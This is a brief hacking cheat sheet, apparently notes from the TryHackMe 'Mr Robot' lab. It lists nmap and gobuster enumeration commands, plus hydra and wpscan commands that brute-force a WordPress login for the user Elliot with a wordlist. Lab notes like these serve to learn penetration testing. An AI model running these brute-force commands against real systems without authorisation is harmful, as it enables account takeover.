##We are going to do basic of Hacking

#Enumeration
1. nmap -Sc -sV <`ip address>
2. nmap -sT <'ip address>
3. nmap -sP <'ip address>

#Enumeration
1. gobuster dir -u <`ip address> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

BruteForcing

1. hydra -L fsocity.txt -p mypassword 10.10.186.250 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:Invalid username"

2. hydra -l Elliot -P fsocity.txt 10.10.186.250 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:The password you entered for the username Elliot is incorrect."

3. wpscan --url http://10.10.89.214 -t 50 -U elliot -P /home/kali/Documents/tryhackme/mr-robot/fsociety.txt